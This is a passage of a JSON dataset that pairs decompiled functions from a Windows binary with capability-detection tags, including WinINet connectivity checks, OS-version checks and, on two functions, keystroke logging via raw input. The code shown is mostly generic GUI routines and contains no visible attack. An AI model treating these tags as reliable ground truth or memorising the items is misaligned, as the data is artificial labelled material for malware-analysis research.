            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a808(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_58h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 0x10)) {\n        if ((param_2 == 0) && (*(iVar1 + 4) == 1)) {\n            fcn.0042386c();\n            *(iVar1 + 0x10) = 0;\n        }\n        else {\n            fcn.00429bf8();\n            fcn.00429c08();\n            puVar3 = iVar1 + 0x18;\n            puVar4 = &fcn.0042a808::var_58h;\n            for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puStack116 = 0x42a86e;\n            var_4h = fcn.00428ab4(0, &fcn.0042a808::var_58h);\n            uStack120 = 0x42a8a0;\n            uStack124 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff84;\n            uVar5 = 0;\n            puStack116 = &stack0xfffffffc;\n            fcn.00429e68(0, *(iVar1 + 0x70), &fcn.0042a808::var_58h);\n            *in_FS_OFFSET = uVar5;\n        }\n        fcn.004289ac();\n        *(in_EAX + 0x22) = 1;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "0042b428": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.0042b428(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack272 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack276 = 0x42b52b;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee8;\n    uStack284 = 0x48;\n    uStack288 = *0x49aa04;\n    uStack292 = 8;\n    puStack296 = 0x42b453;\n    *0x492b8c = sub.kernel32.dll_MulDiv();\n    *0x492b8c = -*0x492b8c;\n    if (**0x495d18 == 1) {\n        puStack296 = 0x42b469;\n        cVar1 = fcn.0042b3e4();\n        if (cVar1 == -0x80) {\n            puStack296 = 0x42b47a;\n            fcn.004055c8();\n        }\n    }\n    puStack296 = 0x42b486;\n    var_8h = fcn.00421670();\n    uStack300 = 0x42b4e3;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.0042174c();\n    cVar1 = fcn.004219b4();\n    if (cVar1 != '\\0') {\n        fcn.00422014();\n        fcn.0042171c();\n    }\n    *in_FS_OFFSET = uStack304;\n    puStack296 = 0x42b4ea;\n    uStack300 = 0x42b4e2;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 481
    },
    "0042ed68": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042ed68(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.0042ec68();\n    uVar1 = fcn.004059dc();\n    uVar1 = sub.kernel32.dll_CreateEventA(in_ECX, -(arg_14h != '\\0'), -(arg_10h != '\\0'), uVar1);\n    *(in_EAX + 4) = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 234
    },
    "0043b6f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043b6f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX == *(*0x49ac1c + 0x30)) {\n        return -(*0x49ac2c != '\\0');\n    }\n    iVar1 = sub.user32.dll_IsIconic();\n    return iVar1;\n}\n",
        "token_count": 87
    },
    "0043c098": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043c098(uint arg_8h)\n\n{\n    int16_t in_AX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (in_AX == 1) {\n        uVar3 = 0x200000;\n    }\n    uVar1 = fcn.00458594(0xfffffff0);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    return uVar2 & 0xffffff00 | (uVar2 & uVar3) != 0;\n}\n",
        "token_count": 143
    },
    "0043c148": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043c148(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar1 = fcn.00458594(0xfffffff0);\n    sub.user32.dll_GetWindowLongA(uVar1);\n    if (*(in_EAX + 0x18) == '\\x01') {\n        iVar2 = fcn.0043c0cc(&stack0xfffffffc);\n        iVar3 = fcn.004501f0();\n        iVar2 = iVar2 + iVar3;\n    }\n    else {\n        iVar2 = fcn.0043c0cc(&stack0xfffffffc);\n        iVar3 = fcn.004501ac();\n        iVar2 = iVar2 + iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 195
    },
    "0043c1e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043c1e0(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_4h;\n    \n    var_1ch = 0x1c;\n    var_18h = 0x10;\n    iVar1 = *(*(arg_8h + -8) + 6);\n    uVar2 = fcn.00458594(*(*(arg_8h + -4) + 0x18) == '\\x01', &var_1ch);\n    iVar3 = (***0x495a04)(uVar2);\n    iVar4 = iVar1;\n    if (iVar3 != 0) {\n        iVar4 = var_4h;\n    }\n    return iVar4;\n}\n",
        "token_count": 204
    },
    "00441ca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441ca0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *in_EDX;\n    \n    if (*(in_EAX + 0x158) == '\\x01') {\n        *in_EDX = 1;\n        *in_ECX = *(in_EAX + 0x160);\n    }\n    else {\n        *in_EDX = 0;\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00444bb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444bb8(void)\n\n{\n    char in_AL;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 8;\n    iStack4 = -(in_AL != '\\0');\n    sub.user32.dll_SystemParametersInfoA(0x49, 8, &uStack8, 0);\n    return;\n}\n",
        "token_count": 81
    },
    "00447104": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447104(int32_t arg_8h)\n\n{\n    uint8_t in_AL;\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_IsWindowVisible(*(*(arg_8h + -4) + 0x30));\n    if ((1U - (iVar1 == 0) == *0x493624) && (in_AL != *0x493624)) {\n        sub.user32.dll_SetWindowPos(*(*(arg_8h + -4) + 0x30), 0, 0, 0, 0, 0, *(in_AL * 2 + 0x493628));\n        *0x493624 = in_AL;\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "00448518": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448518(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4485c5;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar1;\n    if (((*(in_EAX + 0x30) < 1) || (0x8000 < *(in_EAX + 0x30))) || (*(in_EAX + 0x34) < 1)) {\n        fcn.00407550();\n        fcn.0040db04();\n        fcn.00404ec4();\n    }\n    *(in_EAX + 0x38) = 4;\n    *(in_EAX + 0x41) = 1;\n    fcn.00449030();\n    *(in_EAX + 0x43) = 0;\n    *(in_EAX + 0x44) = 0x1fffffff;\n    *(in_EAX + 0x48) = 0x1fffffff;\n    uVar1 = fcn.00429388();\n    *(in_EAX + 0x50) = uVar1;\n    fcn.004485e4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4485cc;\n    uStack20 = 0x4485c4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 386
    },
    "0044871c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044871c(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.00448fb8();\n    if (param_2 == NULL) {\n        (**(**(in_EAX + 0x50) + 0x68))();\n    }\n    else {\n        cVar1 = fcn.004299c8();\n        if (cVar1 == '\\x01') {\n            (**(*param_2 + 0x68))();\n        }\n        else {\n            (**(*param_1 + 8))();\n            (**(*param_1 + 0x70))();\n            (**(*param_1 + 0x68))();\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0044a850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a850(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x6a)) {\n        if (in_EAX[0x17] != 0) {\n            cVar1 = *(in_EAX[0x17] + 0x58);\n            if (cVar1 == '\\x01') {\n                *(in_EAX + 0x6a) = param_2;\n                return;\n            }\n            if (cVar1 == '\\x02') {\n                param_2 = '\\x01';\n            }\n        }\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.00404800();\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x54))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x6a) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "0044dfa4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0044dfa4(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00458594();\n        uVar2 = fcn.00458594(uVar2);\n        iVar3 = sub.user32.dll_IsChild(uVar2);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 117
    },
    "0044e2cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0044e2cc(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(*0x49ac84 + 8) != 0) {\n        iVar1 = fcn.0044e198(*0x49ac84 + 0x10, *(*0x49ac84 + 8));\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 105
    },
    "0044fb5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fb5c(char param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    fcn.004202a0();\n    if (param_1 == '\\x01') {\n        if (param_2 == in_EAX[0x20]) {\n            fcn.004507e4();\n        }\n        else {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (param_2 == iVar1) {\n                fcn.0044f9c8();\n            }\n            else if (param_2 == in_EAX[0x25]) {\n                in_EAX[0x25] = 0;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "004546e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004546e4(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0044fb5c();\n    if ((param_2 == *(in_EAX + 0x23c)) && (param_1 == '\\x01')) {\n        *(in_EAX + 0x23c) = 0;\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "0045473c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045473c(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00450f04();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x2000;\n    }\n    cVar1 = fcn.00450f34();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x4000;\n    }\n    cVar1 = fcn.0040484c();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040484c();\n        if (cVar1 == '\\0') {\n            *param_2 = *param_2 | 0x1000;\n        }\n        else {\n            cVar1 = fcn.0040484c();\n            if (cVar1 == '\\x01') {\n                *param_2 = *param_2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0045a190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045a190(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    bool bVar3;\n    uint x;\n    uint y;\n    uint var_4h;\n    \n    bVar3 = false;\n    cVar1 = fcn.004485d0();\n    if ((cVar1 != '\\0') && (in_EDX != *(in_EAX + 0x6c))) {\n        fcn.0045a1f4();\n        *(in_EAX + 0x6c) = in_EDX;\n        fcn.0045a070(&x);\n        iVar2 = sub.comctl32.dll_ImageList_DragEnter(*(in_EAX + 0x6c), x, y);\n        bVar3 = iVar2 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 205
    },
    "0045a218": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0045a218(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack28;\n    uint *puVar4;\n    uint auStack20 [2];\n    \n    puVar4 = auStack20;\n    cVar1 = fcn.004485d0();\n    if (cVar1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.0045a070(auStack20);\n        uStack28 = auStack20[0];\n        iVar2 = sub.comctl32.dll_ImageList_DragMove(puVar4);\n        uVar3 = iVar2 != 0;\n    }\n    return CONCAT44(uStack28, uVar3);\n}\n",
        "token_count": 170
    },
    "0045a50c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a50c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.0045a59c();\n        }\n        else {\n            fcn.0040db04();\n            fcn.00404ec4();\n        }\n        return;\n    }\n    fcn.0045a59c();\n    return;\n}\n",
        "token_count": 153
    },
    "0045a554": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a554(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.0045a620();\n        }\n        else {\n            fcn.0040db04();\n            fcn.00404ec4();\n        }\n        return;\n    }\n    fcn.0045a620();\n    return;\n}\n",
        "token_count": 150
    },
    "0045ab04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ab04(int32_t param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x45ab19;\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n    }\n    puStack48 = 0x45ab2c;\n    fcn.00404620();\n    in_EAX[3] = 4;\n    in_EAX[5] = param_1;\n    in_EAX[0x1c] = 0x80000;\n    in_EAX[6] = 0xc;\n    if ((*(param_1 + 0x5b) == '\\x01') || (*(param_1 + 0x5b) == '\\x02')) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 7) = uVar1;\n    puStack48 = 0x45ab7d;\n    iVar2 = fcn.0045a478();\n    in_EAX[0x19] = iVar2;\n    puStack48 = 0x45ab8f;\n    iVar2 = fcn.00424dbc();\n    in_EAX[4] = iVar2;\n    puStack48 = 0x45aba3;\n    fcn.0042b8b4();\n    puStack48 = 0x45abac;\n    fcn.00424f38();\n    puStack48 = 0x45abb4;\n    fcn.0045acd8();\n    uStack52 = 0x45ac11;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar2 = fcn.00454684();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00454648(0);\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0045a6d8();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x45ac18;\n    uStack52 = 0x45ac10;\n    fcn.0045acdc();\n    return;\n}\n",
        "token_count": 600
    },
    "0045c808": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c808(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0045d5d8();\n    fcn.0045c8d0();\n    sub.user32.dll_ReleaseDC(*(in_EAX + 0x5c), *(in_EAX + 0x58));\n    if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n        fcn.0045aa1c();\n    }\n    else {\n        fcn.0045aa1c();\n    }\n    fcn.0045c72c();\n    fcn.0045adb0(0x45c8ac);\n    *(in_EAX + 0x60) = 0;\n    return;\n}\n",
        "token_count": 175
    },
    "0045c8d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c8d0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n            iVar1 = fcn.0045a59c();\n            iVar2 = *(in_EAX + 0xc) >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar2 = *(in_EAX + 0x54) - iVar2;\n            iVar3 = fcn.0045a620(iVar1, iVar2);\n            iVar3 = iVar3 + iVar1;\n            iVar4 = iVar2 + *(in_EAX + 0xc);\n        }\n        else {\n            iVar1 = *(in_EAX + 0xc) >> 1;\n            if (iVar1 < 0) {\n                iVar1 = iVar1 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar1 = *(in_EAX + 0x50) - iVar1;\n            iVar2 = fcn.0045a59c(iVar1);\n            iVar3 = iVar1 + *(in_EAX + 0xc);\n            iVar4 = fcn.0045a620(iVar1, iVar2, iVar3);\n            iVar4 = iVar4 + iVar2;\n        }\n        iVar4 = fcn.00424f98(iVar1, iVar2, iVar3, iVar4);\n        iVar3 = *(in_EAX + 0x58);\n        uVar5 = sub.gdi32.dll_SelectObject(iVar3, iVar4);\n        sub.gdi32.dll_PatBlt(*(in_EAX + 0x58), iVar3, iVar4, iVar1 - iVar3, iVar2 - iVar4, 0x5a0049);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 0x58), uVar5);\n    }\n    return;\n}\n",
        "token_count": 508
    },
    "0045d1e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d1e8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    piVar3 = arg_8h + -4;\n    iVar1 = *(*piVar3 + 0x18);\n    if (*(*(*(*piVar3 + 0x60) + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.0045a59c();\n        if (*(*piVar3 + 0x54) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x54) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0045ca4c();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x54)) {\n            *(*piVar3 + 0x54) = iVar2 - iVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.0045a59c();\n        if (*(*piVar3 + 0x50) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x50) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0045ca4c();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x50)) {\n            *(*piVar3 + 0x50) = iVar2 - iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 331
    },
    "0045d430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045d430(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = 1;\n    *(in_EAX + 8) = 5;\n    if (((**0x495d18 == 2) && (3 < **0x49595c)) ||\n       ((**0x495d18 == 1 && ((4 < **0x49595c || ((**0x49595c == 4 && (9 < **0x495b8c)))))))) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0xd) = uVar1;\n    fcn.0045d620();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 282
    },
    "0045d564": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d564(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (***0x495974)(0x13);\n    *(in_EAX + 0xc) = '\\x01' - (iVar1 == 0);\n    return;\n}\n",
        "token_count": 70
    },
    "0045d580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d580(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = (***0x495974)(0x4b);\n    cVar2 = '\\x01' - (iVar1 == 0);\n    *(in_EAX + 0x20) = cVar2;\n    if (cVar2 != '\\0') {\n        sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "00464028": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00464028(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 9) = 0;\n    *(in_EAX + 8) = 0;\n    *(in_EAX + 0x24) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x1c) = 0;\n    *(in_EAX + 0x20) = 0;\n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    *(in_EAX + 0x30) = param_1;\n    fcn.00406928(param_1);\n    fcn.00463fa8();\n    *(in_EAX + 0x38) = 0x696;\n    *(in_EAX + 0x40) = 0;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 10) = 0;\n    uVar1 = fcn.004210ec(fcn.00463eec, in_EAX);\n    *(in_EAX + 0x34) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x1c4c) = uVar1;\n    uVar2 